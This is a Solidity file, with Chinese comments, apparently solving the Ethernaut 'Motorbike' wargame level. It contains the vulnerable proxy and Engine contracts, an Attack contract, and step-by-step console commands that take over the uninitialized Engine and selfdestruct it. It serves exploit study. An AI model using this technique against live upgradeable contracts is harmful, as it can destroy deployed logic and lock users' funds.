// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/utils/Address.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/proxy/Initializable.sol";

/**
 * 通关条件：自毁Engine
 * 本合约所有操作均通过fallback调用_delegate
 * 思路：
 * 1.部署一个攻击合约，其中包含自毁函数
 * 2.await web3.eth.getStorageAt(contract.address, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")获取engine地址
 * 3.调用engine的initialize，此时为upgrader为player，可以调用upgradeToAndCall了
 * 4.构建调用合约的data(Attack.getData)
 * 5.向Motorbike发送交易。PS：在remix调用失败，在浏览器使用await web3.eth.sendTransaction({from:player,to:engine,data:data})成功
 */
contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    struct AddressSlot {
        address value;
    }

    // 使用_logic初始化可升级代理,并delegatecall initialize函数,初始化了第二三个slot
    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success, ) = _logic.delegatecall(abi.encodeWithSignature("initialize()"));
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            // 将当前环境中的输入数据(calldata)复制到内存中
            calldatacopy(0, 0, calldatasize())
            // delegatecall(gas, address, argsOffset, argsSize, retOffset, retSize)
            // 向implementation发送信息,但保留发件人和值的当前值
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            // 将上一次调用的输出数据复制到内存(CALL, CALLCODE, DELEGATECALL or STATICCALL.)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 {
                revert(0, returndatasize())
            }
            default {
                return(0, returndatasize())
            }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`.
    // Will run if no other function in the contract matches the call data
    fallback() external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}

contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    // 初始化而且只限一次
    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // 更新_IMPLEMENTATION_SLOT并delegatecall并调用
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // 要求调用者是upgrader
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // 更新_IMPLEMENTATION_SLOT并delegatecall
    function _upgradeToAndCall(address newImplementation, bytes memory data) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success, ) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }

    // 更新_IMPLEMENTATION_SLOT
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");

        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}

contract Attack {
    function destory(address payable addr) public {
        selfdestruct(addr);
    }

    function getData() public view returns(bytes memory) {
        bytes memory data1 = abi.encodeWithSignature("destory(address)", msg.sender);
        bytes memory data2 = abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(this), data1);
        return data2;
    }
}
